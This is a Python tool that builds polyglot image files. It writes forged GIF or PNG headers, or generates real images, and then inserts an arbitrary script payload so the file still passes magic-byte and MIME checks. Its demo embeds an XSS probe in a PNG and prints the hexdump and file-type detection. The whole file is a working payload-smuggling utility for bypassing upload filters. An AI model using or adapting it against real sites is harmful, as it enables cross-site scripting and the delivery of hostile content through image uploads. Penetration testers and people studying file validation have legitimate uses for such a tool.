import os
import sys
import png
import binascii
import puremagic
from PIL import Image, ImageDraw, ImageFile

ImageFile.LOAD_TRUNCATED_IMAGES = True

def hex_viewer(out_file): 
    with open(out_file, 'r+b') as f:
            malicious_image = f.read()

    def hexdump(src, length=16, sep='.'):
        FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or sep for x in range(256)])
        lines  = []
        for c in range(0, len(src), length):
            chars = src[c:c+length]
            hexstr = ' '.join(["%02x" % ord(x) for x in chars]) if type(chars) is str else ' '.join(['{:02x}'.format(x) for x in chars])

            if len(hexstr) > 24:
                hexstr = "%s %s" % (hexstr[:24], hexstr[24:])
            printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or sep) for x in chars]) if type(chars) is str else ''.join(['{}'.format((x <= 127 and FILTER[x]) or sep) for x in chars])
            lines.append("%08x:  %-*s  |%s|" % (c, length*3, hexstr, printable))

        return '\n'.join(lines)

    if len(malicious_image) > 256:
        return(hexdump(malicious_image[0:128]) + '\n' + '*' + '\n' + hexdump(malicious_image[-128:]))
    else:
        return(hexdump(malicious_image))

class Headers:
    def __init__(self):
        pass

    def gif_header_data(self):
        # GIF Header (13 bytes)
        header  = b'\x47\x49\x46\x38\x39\x61'  # Signature and version  (GIF89a)
        header += b'\x0a\x00'                  # Logical Screen Width   (10 pixels)
        header += b'\x0a\x00'                  # Logical Screen Height  (10 pixels)
        header += b'\x00'                      # GCTF
        header += b'\xff'                      # Background Color       (#255)
        header += b'\x00'                      # Pixel Aspect Ratio

        # Global Color Table + Blocks (13 bytes)
        header += b'\x2c'                      # Image Descriptor
        header += b'\x00\x00\x00\x00'          # NW corner position of image in logical screen
        header += b'\x0a\x00\x0a\x00'          # Image width and height in pixels
        header += b'\x00'                      # No local color table
        header += b'\x02'                      # Start of image
        header += b'\x00'                      # End of image data
        header += b'\x3b'                      # GIF file terminator

        return header

    def bmp_header_data(self):
        # BMP Header (14 bytes)
        header  = b'\x42\x4d'          # Magic bytes header       (`BM`)
        header += b'\x1e\x00\x00\x00'  # BMP file size            (30 bytes)
        header += b'\x00\x00'          # Reserved                 (Unused)
        header += b'\x00\x00'          # Reserved                 (Unused)
        header += b'\x1a\x00\x00\x00'  # BMP image data offset    (26 bytes)

        # DIB Header (12 bytes)
        header += b'\x0c\x00\x00\x00'  # DIB header size          (12 bytes)
        header += b'\x01\x00'          # Width of bitmap          (1 pixel)
        header += b'\x01\x00'          # Height of bitmap         (1 pixel)
        header += b'\x01\x00'          # Number of color planes   (1 plane)
        header += b'\x18\x00'          # Number of bits per pixel (24 bits)

        # BMP Image Pixel Array (4 bytes)
        header += b'\x00\x00\xff'      # Red, Pixel (0,1)
        header += b'\x00'              # Padding for 4 byte alignment

        return header

    def png_header_data(self):
        # PNG header 
        header = b'\x89\x50\x4e\x47\x0d\x0a\x1a\x0a'    # PNG signature
        header += b'\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90\x77\x53\xde'   # Image header
        header += b'\x00\x00\x00\x0c\x49\x44\x41\x54\x08\xd7\x63\xf8\xcf\xc0\x00\x00\x03\x01\x01\x00\x18\xdd\x8d\xb0'   # Image data

        return header

    def png_end(self):
        header = b'\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82'   # Image end
        return header

class Injector:
    def __init__(self, img_type, width, height, payload, extension):
        self.img_type = img_type
        self.width = width
        self.height = height
        self.payload = payload
        self.extension = extension

    def create_txt(self, extension):
        filename = 'demo.' + extension
        f = open(filename, "w")
        f.close()
        return filename

    def create_gif(self, width, height, extension):
        filename = 'demo.' + extension
        images = []
        center = width // 2
        color = (0, 0, 0)
        max_radius = int(center * 1.5)
        step = 8

        for i in range(0, max_radius, step):
            im = Image.new('RGB', (width, height), color)
            draw = ImageDraw.Draw(im)
            draw.ellipse((center - i, center - i, center + i, center + i), fill=color)
            images.append(im)

        images[0].save(filename, save_all=True)
        return filename

    def create_png(self, width, height, extension):
        filename = 'demo.' + extension
        img = []
        for y in range(height):
            row = ()
            for x in range(width):
                row = row + (x, max(0, 255 - x - y), y)
            img.append(row)
        with open(filename, 'wb') as f:
            w = png.Writer(width, height, greyscale=False)
            w.write(f, img)
        return filename

    def inject(self, payload, contents, out_file, contents_end=b''):
        f = open(out_file, "w+b")
        f.write(contents)
        f.write(b'\x2f\x2f\x2f\x2f\x2f')
        f.write(payload)
        f.write(b'\x3b')
        f.write(contents_end)
        f.close()

    def main(self):
        if self.img_type == 'PNG':
            if self.width != 0 and self.height != 0:
                final_filename = self.create_png(self.width, self.height, self.extension)
                f = open(final_filename, "r+b")
                f.seek(50)
                f.write(b'\x2f\x2f\x2f\x2f\x2f')
                f.write(payload)
                f.write(b'\x3b')
                return final_filename, (self.width, self.height)
            else:
                final_filename = self.create_txt(self.extension)
                png_header = Headers().png_header_data()
                png_end = Headers().png_end()
                self.inject(payload=payload, contents=png_header, out_file=final_filename, contents_end=png_end)
                im = Image.open(final_filename)
                width, height = im.size
                im.close()
                return final_filename, (width, height)
        elif self.img_type == 'GIF':
            if self.width != 0 and self.height != 0:
                final_filename = self.create_gif(self.width, self.height, self.extension)
                f = open(final_filename, "ab")
                f.write(b'\x2f\x2f\x2f\x2f\x2f')
                f.write(payload)
                f.write(b'\x3b')
                f.close()
                return final_filename, (self.width, self.height)
            else:            
                final_filename = self.create_txt(self.extension)
                gif_header = Headers().gif_header_data()
                self.inject(payload=payload, contents=gif_header, out_file=final_filename)
                im = Image.open(final_filename)
                width, height = im.size
                im.close()
                return final_filename, (width, height)

if __name__ == '__main__':
    payload = '<script>alert(1)</script>'.encode()
    injection = Injector('PNG', 150, 150, payload, 'png')
    final_filename, dimensions = injection.main()
    print("HEX")
    print(hex_viewer(final_filename))

    print("Image details")
    print("Name: ", puremagic.magic_file(final_filename)[0].name)
    print("Extension: ", puremagic.magic_file(final_filename)[0].extension)
    print("Mime type: ", puremagic.magic_file(final_filename)[0].mime_type)
    print("Byte match: ", puremagic.magic_file(final_filename)[0].byte_match.decode('UTF-8','ignore').strip())

    print("Dimensions: ", dimensions)
    print("Filename: ", final_filename)